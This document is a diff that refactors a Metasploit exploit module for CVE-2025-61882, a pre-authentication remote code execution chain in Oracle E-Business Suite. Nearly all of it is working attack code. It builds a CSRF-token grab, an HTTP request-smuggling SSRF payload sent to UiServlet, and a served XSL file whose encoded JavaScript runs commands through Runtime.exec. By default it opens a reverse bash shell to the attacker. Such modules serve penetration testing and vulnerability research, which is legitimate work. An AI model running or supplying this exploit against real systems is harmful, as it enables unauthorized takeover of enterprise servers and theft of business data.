@@ -1,3 +1,5 @@
+# frozen_string_literal: true
+
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,22 +10,23 @@ class MetasploitModule < Msf::Exploit::Remote
 
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::Remote::HttpServer
+  include Msf::Exploit::Retry
 
   def initialize(info = {})
     super(
       update_info(
         info,
         'Name' => 'Oracle E-Business Suite CVE-2025-61882 RCE',
-        'Description' => %q{
+        'Description' => '
           This module exploits CVE-2025-61882 in Oracle E-Business Suite
-          through chaining of SSRF, Path traversal,HTTP request smuggling and XSLT injection.
+          by combining SSRF, Path Traversal, HTTP request smuggling and XSLT injection.
 
           The exploit hosts a malicious XSL file
           that the target will fetch and process, leading to RCE.
 
-          This module provides a full interactive shell session.
+          This module provides an interactive shell session.
           Vulnerable versions affected are 12.2.3-12.2.14.
-        },
+        ',
         'Author' => [
           'watchTowr (Sonny, Sina Kheirkhah, Jake Knott)', # Original Python POC and blog Article
           'Mathieu Dupas' # Metasploit module development
@@ -31,15 +34,15 @@ class MetasploitModule < Msf::Exploit::Remote
         'License' => MSF_LICENSE,
         'References' => [
           ['CVE', '2025-61882'],
-          ['URL', 'https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/' ],
+          ['URL',
+           'https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/'],
           ['URL', 'https://www.oracle.com/security-alerts/alert-cve-2025-61882.html']
         ],
-        'Platform' => ['unix', 'linux', 'win'],
         'Targets' => [
           [
             'Linux/Unix (Interactive Shell)',
             {
-              'Platform' => ['unix', 'linux'],
+              'Platform' => %w[unix linux],
               'Arch' => ARCH_CMD,
               'DefaultOptions' => {
                 'PAYLOAD' => 'cmd/unix/reverse_bash'
@@ -60,7 +63,6 @@ class MetasploitModule < Msf::Exploit::Remote
         'DefaultTarget' => 0,
         'DisclosureDate' => '2025-10-04',
         'DefaultOptions' => {
-          'PAYLOAD' => 'cmd/unix/reverse_bash',
           # Handler delay
           'WfsDelay' => 10
         },
@@ -73,31 +75,24 @@ class MetasploitModule < Msf::Exploit::Remote
     )
 
     register_options([
-      Opt::RPORT(8000),
-      OptString.new('TARGETURI', [true, 'Base path to Oracle EBS', '/']),
-      OptString.new('SRVHOST', [true, 'The local host to listen on for XSL callback', '0.0.0.0']),
-      OptPort.new('SRVPORT', [true, 'The local port to listen on for XSL callback', 8080]),
-      OptInt.new('HTTP_TIMEOUT', [true, 'Time to wait for target to fetch XSL (seconds)', 20]),
-      OptInt.new('SHELL_TIMEOUT', [true, 'Time to wait for shell after XSL delivery (seconds)', 30]),
-    ])
+                       Opt::RPORT(8000),
+                       OptString.new('TARGETURI', [true, 'Base path to Oracle EBS', '/']),
+                       OptString.new('SRVHOST', [true, 'The local host to listen on for XSL callback', '0.0.0.0']),
+                       OptPort.new('SRVPORT', [true, 'The local port to listen on for XSL callback', 8080]),
+                       OptInt.new('HTTP_TIMEOUT', [true, 'Time to wait for target to fetch XSL (seconds)', 20]),
+                       OptInt.new('SHELL_TIMEOUT', [true, 'Time to wait for shell after XSL delivery (seconds)', 30])
+                     ])
   end
 
   def check
+    vprint_status('Checking if target is vulnerable...')
 
-    vprint_status("Checking if target is vulnerable...")
-
-    unless oracle_ebs_detected?
-      return CheckCode::Safe
-    end
+    return CheckCode::Safe unless oracle_ebs_detected?
 
     csrf_token = retrieve_csrf_token
-    unless csrf_token
-      return CheckCode::Unknown
-    end
+    return CheckCode::Unknown unless csrf_token
 
-    if vulnerable_servlet_accessible?(csrf_token)
-      return CheckCode::Appears
-    end
+    return CheckCode::Appears if vulnerable_servlet_accessible?(csrf_token)
 
     CheckCode::Safe
   end
@@ -106,21 +101,19 @@ class MetasploitModule < Msf::Exploit::Remote
   def on_request_uri(cli, request)
     print_good("Received request: #{request.method} #{request.uri} from #{cli.peerhost}:#{cli.peerport}")
 
-
     if request.uri.include?('.xsl')
       print_good("Serving  XSL payload to #{cli.peerhost}...")
-
-      # Mark XSL file as served
-      @xsl_served = true
 
       xsl_content = generate_xsl_payload
 
       send_response(cli, xsl_content, {
-        'Content-Type' => 'application/xml',
-        'Content-Length' => xsl_content.length.to_s,
-        'Connection' => 'close'
-      })
+                      'Content-Type' => 'application/xml',
+                      'Content-Length' => xsl_content.length.to_s,
+                      'Connection' => 'close'
+                    })
 
+      # Mark XSL file as served
+      @xsl_served = true
       print_good("XSL payload delivered successfully to #{cli.peerhost} (#{xsl_content.length} bytes)")
 
     else
@@ -130,31 +123,32 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def generate_xsl_payload
-     # Generate XSLT payload that will execute commands
+    # Generate XSLT payload that will execute commands
 
-      command = payload.encoded
-      vprint_status("Generated command: #{command}")
+    command = payload.encoded
+    vprint_status("Generated command: #{command}")
 
     # Adapt the command to the platform
-    case target['Platform']
-    when 'win'
-      base_cmd = ['cmd.exe', '/c']
-    else
-      base_cmd = ['bash', '-c']
-    end
+    base_cmd = case target['Platform']
+               when 'win'
+                 ['cmd.exe', '/c']
+               else
+                 ['sh', '-c']
+               end
 
     # Escaping apostrophes and backslashes
-    escaped_command = command.gsub("\\", "\\\\\\\\").gsub("'", "\\\\'")
+    escaped_command = command.gsub('\\', '\\\\\\\\').gsub("'", "\\\\'")
 
+    js_vars = Rex::RandomIdentifier::Generator.new({ language: :javascript })
     # JavaScript code that will be executed server side via XSLT
-    js = %Q|
-    var stringc = java.lang.Class.forName('java.lang.String');
-    var cmds = java.lang.reflect.Array.newInstance(stringc, 3);
-    java.lang.reflect.Array.set(cmds, 0, '#{base_cmd[0]}');
-    java.lang.reflect.Array.set(cmds, 1, '#{base_cmd[1]}');
-    java.lang.reflect.Array.set(cmds, 2, '#{escaped_command}');
-    var runtime = java.lang.Runtime.getRuntime();
-    var proc = runtime.exec(cmds);
+    js = %|
+    var #{js_vars[:string_c]} = java.lang.Class.forName('java.lang.String');
+    var #{js_vars[:cmds]} = java.lang.reflect.Array.newInstance(#{js_vars[:string_c]}, 3);
+    java.lang.reflect.Array.set(#{js_vars[:cmds]}, 0, '#{base_cmd[0]}');
+    java.lang.reflect.Array.set(#{js_vars[:cmds]}, 1, '#{base_cmd[1]}');
+    java.lang.reflect.Array.set(#{js_vars[:cmds]}, 2, '#{escaped_command}');
+    var #{js_vars[:run_time]} = java.lang.Runtime.getRuntime();
+    var #{js_vars[:proc]} = #{js_vars[:run_time]}.exec(#{js_vars[:cmds]});
     1
     |
 
@@ -162,7 +156,7 @@ class MetasploitModule < Msf::Exploit::Remote
     encoded_js = Rex::Text.encode_base64(js)
 
     # Generate XSLT
-    xsl = %Q|<?xml version="1.0" encoding="UTF-8"?>
+    %|<?xml version="1.0" encoding="UTF-8"?>
 <xsl:stylesheet version="1.0"
     xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
     xmlns:b64="http://www.oracle.com/XSL/Transform/java/sun.misc.BASE64Decoder"
@@ -178,8 +172,6 @@ class MetasploitModule < Msf::Exploit::Remote
         <xsl:value-of select="$code"/>
     </xsl:template>
 </xsl:stylesheet>|
-
-    xsl
   end
 
   def exploit
@@ -195,114 +187,73 @@ class MetasploitModule < Msf::Exploit::Remote
       }
     )
 
-    # Wait for server
-    sleep(1)
-
     # construct server URL
     server_url = get_uri
     xsl_url = "#{server_url}#{Rex::Text.rand_text_alpha(8)}.xsl"
     print_status("XSL payload will be served at: #{xsl_url}")
 
     # Step 2: Get CSRF token
-    print_status("Retrieving CSRF token from target...")
+    print_status('Retrieving CSRF token from target...')
     csrf_token = retrieve_csrf_token
 
-    unless csrf_token
-      fail_with(Failure::Unknown, 'Could not retrieve CSRF token')
-    end
+    fail_with(Failure::Unknown, 'Could not retrieve CSRF token') unless csrf_token
 
-    print_good("CSRF token retrieved: #{csrf_token[0..20]}...")
+    print_good("CSRF token retrieved: #{csrf_token}")
 
     # Step 3: Smuggle payload
-    print_status("Creating HTTP request smuggling payload...")
-    smuggle_payload = create_smuggle_payload(xsl_url)
+    print_status('Creating HTTP request smuggling payload...')
+    smuggle_payload = create_smuggle_payload
 
     vprint_status("Smuggled payload created (#{smuggle_payload.length} bytes)")
 
     # Step 4: Send exploit request
-    print_status("Triggering exploitation via UiServlet...")
+    print_status('Triggering exploitation via UiServlet...')
     send_exploit_request(smuggle_payload)
 
     # Step 5: Wait for XSLT file download
     print_status("Keeping HTTP server alive, waiting for callback to #{datastore['LHOST']}:#{datastore['LPORT']}...")
-    print_status("(Press Ctrl-C to stop)")
 
-    # Wait < HTTP_TIMEOUT seconds for XSL download
-    timeout = datastore['HTTP_TIMEOUT']
-    waited = 0
-
-    while waited < timeout
-      if @xsl_served
-        #vprint_good("XSL payload successfully delivered!")
-
-        # Wait for shell connection
-        shell_timeout = datastore['SHELL_TIMEOUT']
-        print_status("Waiting up to #{shell_timeout} seconds for reverse shell connection...")
-
-        shell_waited = 0
-        while shell_waited < shell_timeout
-          # check session
-          if framework.sessions.length > 0
-            print_good("Session created successfully!")
-            @session_created = true
-            break
-          end
-
-          sleep(1)
-          shell_waited += 1
-
-          if shell_waited % 5 == 0
-            vprint_status("Waiting for shell... (#{shell_waited}/#{shell_timeout}s)")
-          end
-        end
-
-        break
+    begin
+      # Wait for XSL request
+      retry_until_truthy(timeout: datastore['HTTP_TIMEOUT']) do
+        @xsl_served
       end
 
-      sleep(1)
-      waited += 1
-
-      # Activity feedback every 5s
-      if waited % 5 == 0
-        vprint_status("Waiting for XSL request... (#{waited}/#{timeout}s)")
+      # Wait for shell connection
+      print_status("Waiting up to #{datastore['SHELL_TIMEOUT']} seconds for reverse shell connection...")
+      retry_until_truthy(timeout: datastore['SHELL_TIMEOUT']) do
+        session_created?
       end
-    end
 
-    unless @xsl_served
-      print_error("Timeout waiting for target to fetch XSL payload")
-    end
-
-    unless @session_created
-      if @xsl_served
-        print_error("XSL was delivered but no session was created")
+      print_good('Session created successfully!')
+      @session_created = true
+    rescue ::Timeout::Error
+      if !@xsl_served
+        print_error("XSL request timeout (#{datastore['HTTP_TIMEOUT']}s) expired")
+      else
+        print_error("Shell timeout (#{datastore['SHELL_TIMEOUT']}s) expired")
       end
-    end
-
-    # Keep server active just in case
-    if @xsl_served && !@session_created
-      print_status("Keeping server alive for 10 more seconds in case of delay...")
-      sleep(10)
     end
   end
 
   def retrieve_csrf_token
     res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'runforms.jsp'),
-      'keep_cookies' => true
-    })
+                             'method' => 'GET',
+                             'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'runforms.jsp'),
+                             'keep_cookies' => true
+                           })
 
     return nil unless res
 
     res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'JavaScriptServlet'),
-      'headers' => {
-        'CSRF-XHR' => 'YES',
-        'FETCH-CSRF-TOKEN' => '1'
-      },
-      'keep_cookies' => true
-    })
+                             'method' => 'POST',
+                             'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'JavaScriptServlet'),
+                             'headers' => {
+                               'CSRF-XHR' => 'YES',
+                               'FETCH-CSRF-TOKEN' => '1'
+                             },
+                             'keep_cookies' => true
+                           })
 
     if res && res.code == 200 && res.body
       parts = res.body.split(':')
@@ -315,14 +266,11 @@ class MetasploitModule < Msf::Exploit::Remote
     nil
   end
 
-  def create_smuggle_payload(xsl_url)
-
+  def create_smuggle_payload
     srvhost = datastore['SRVHOST']
     srvport = datastore['SRVPORT']
 
-    if srvhost == '0.0.0.0'
-      srvhost = Rex::Socket.source_address(rhost)
-    end
+    srvhost = Rex::Socket.source_address(rhost) if srvhost == '0.0.0.0'
 
     smuggle_request = "POST /OA_HTML/help/../ieshostedsurvey.jsp HTTP/1.2\r\n"
     smuggle_request += "Host: #{srvhost}:#{srvport}\r\n"
@@ -331,15 +279,13 @@ class MetasploitModule < Msf::Exploit::Remote
 
     # Add sessions cookies
     cookies = get_cookies
-    if cookies && !cookies.empty?
-      smuggle_request += "Cookie: #{cookies}\r\n"
-    end
+    smuggle_request += "Cookie: #{cookies}\r\n" if cookies && !cookies.empty?
 
     # Add POST request via CRLF
     smuggle_request += "\r\n\r\n\r\nPOST /"
 
     vprint_status("Smuggled request will target: #{srvhost}:#{srvport}")
-    vprint_status("Full smuggled request:")
+    vprint_status('Full smuggled request:')
     vprint_line(smuggle_request) if datastore['VERBOSE']
 
     # Encode payload in HTML entities
@@ -347,34 +293,41 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def cook_smuggle_stub(payload)
-    payload = payload.sub(/^POST /, '').sub(/^GET /, '')
+    payload = payload.sub(/^(?:POST|GET) /, '')
 
     # Encode in HTML entities
-    payload.chars.map { |char| "&##{char.ord};" }.join
+    Rex::Text.html_encode(payload)
   end
 
   def send_exploit_request(encoded_payload)
     # Encoded payload is inserted in return_url (SSRF)
 
-    xml = %Q|<?xml version="1.0" encoding="UTF-8"?><initialize><param name="init_was_saved">test</param><param name="return_url">http://apps.example.com:7201#{encoded_payload}</param><param name="ui_def_id">0</param><param name="config_effective_usage_id">0</param><param name="ui_type">Applet</param></initialize>|
+    xml = %(<?xml version="1.0" encoding="UTF-8"?>\
+    <initialize>\
+    <param name="init_was_saved">test</param>\
+    <param name="return_url">http://apps.example.com:7201#{encoded_payload}</param>\
+    <param name="ui_def_id">0</param>\
+    <param name="config_effective_usage_id">0</param>\
+    <param name="ui_type">Applet</param>\
+    </initialize>)
 
-    vprint_status("Sending exploit to UiServlet...")
+    vprint_status('Sending exploit to UiServlet...')
 
     res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'configurator', 'UiServlet'),
-      'vars_post' => {
-        'redirectFromJsp' => '1',
-        'getUiType' => xml
-      },
-      'keep_cookies' => true
-    })
+                             'method' => 'POST',
+                             'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'configurator', 'UiServlet'),
+                             'vars_post' => {
+                               'redirectFromJsp' => '1',
+                               'getUiType' => xml
+                             },
+                             'keep_cookies' => true
+                           })
 
     if res
       vprint_status("UiServlet responded with: #{res.code}")
       vprint_status("Response body length: #{res.body.length} bytes") if res.body
     else
-      print_warning("No response from UiServlet (this might be normal)")
+      print_warning('No response from UiServlet (this might be normal)')
     end
 
     res
@@ -390,17 +343,17 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def oracle_ebs_detected?
     res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'runforms.jsp')
-    })
+                             'method' => 'GET',
+                             'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'runforms.jsp')
+                           })
 
     res && (res.headers['Server']&.include?('Oracle') ||
-            res.body&.include?('Oracle'))  # maybe to adapt for different versions. Fully Tested on version 12.2.12
-  rescue
+            res.body&.include?('Oracle')) # maybe to adapt for different versions. Fully Tested on version 12.2.12
+  rescue StandardError
     false
   end
 
-  def vulnerable_servlet_accessible?(csrf_token)
+  def vulnerable_servlet_accessible?(_csrf_token)
     test_xml = '<?xml version="1.0" encoding="UTF-8"?>' \
                '<initialize>' \
                '<param name="init_was_saved">test</param>' \
@@ -411,17 +364,17 @@ class MetasploitModule < Msf::Exploit::Remote
                '</initialize>'
 
     res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'configurator', 'UiServlet'),
-      'vars_post' => {
-        'redirectFromJsp' => '1',
-        'getUiType' => test_xml
-      },
-      'keep_cookies' => true
-    })
+                             'method' => 'POST',
+                             'uri' => normalize_uri(target_uri.path, 'OA_HTML', 'configurator', 'UiServlet'),
+                             'vars_post' => {
+                               'redirectFromJsp' => '1',
+                               'getUiType' => test_xml
+                             },
+                             'keep_cookies' => true
+                           })
 
-    res && (res.code == 200 || res.code == 302)
-  rescue
+    res && [200, 302].include?(res.code)
+  rescue StandardError
     false
   end
 end
